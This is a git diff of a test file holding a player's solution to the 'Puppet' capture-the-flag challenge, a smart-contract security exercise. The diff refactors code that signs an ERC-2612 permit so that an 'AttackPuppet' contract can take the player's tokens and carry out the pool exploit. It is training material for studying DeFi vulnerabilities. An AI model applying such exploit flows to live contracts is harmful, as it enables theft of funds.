@@ -109,19 +109,40 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        async function attackWithContract() {
+        async function signERC2612Permit(
+            token,
+            owner,
+            spender,
+            value,
+            deadline,
+            nonce
+        ) {
             const chainId = (await ethers.provider.getNetwork()).chainId
 
-            const attackContractAddress = ethers.utils.getContractAddress({
-                from: player.address,
-                nonce: 0
-            })
+            const name = ethers.utils.defaultAbiCoder.decode(
+                ['string'],
+                await ethers.provider.call({
+                    to: token,
+                    data: '0x06fdde03'
+                })
+            )[0]
+
+            const currentNonce = ethers.utils.defaultAbiCoder.decode(
+                ['uint256'],
+                await ethers.provider.call({
+                    to: token,
+                    data: ethers.utils.hexConcat([
+                        '0x7ecebe00',
+                        ethers.utils.hexZeroPad(player.address, 32)
+                    ])
+                })
+            )[0]
 
             const domain = {
-                name: 'DamnValuableToken',
+                name,
                 version: '1',
                 chainId,
-                verifyingContract: token.address
+                verifyingContract: token
             }
             const types = {
                 Permit: [
@@ -133,11 +154,11 @@ describe('[Challenge] Puppet', function () {
                 ]
             }
             const message = {
-                owner: player.address,
-                spender: attackContractAddress,
-                value: PLAYER_INITIAL_TOKEN_BALANCE,
-                nonce: 0,
-                deadline: ethers.constants.MaxUint256
+                owner,
+                spender,
+                value,
+                nonce: nonce || currentNonce,
+                deadline: deadline || ethers.constants.MaxUint256
             }
 
             const signature = await player._signTypedData(domain, types, message)
@@ -145,6 +166,22 @@ describe('[Challenge] Puppet', function () {
             const r = signature.slice(0, 66)
             const s = '0x' + signature.slice(66, 130)
             const v = parseInt(signature.slice(130, 132), 16)
+
+            return { r, s, v }
+        }
+
+        async function attackWithContract() {
+            const attackContractAddress = ethers.utils.getContractAddress({
+                from: player.address,
+                nonce: await ethers.provider.getTransactionCount(player.address)
+            })
+
+            const { v, r, s } = await signERC2612Permit(
+                token.address,
+                player.address,
+                attackContractAddress,
+                PLAYER_INITIAL_TOKEN_BALANCE
+            )
 
             const attackContractFactory = await ethers.getContractFactory(
                 'AttackPuppet'
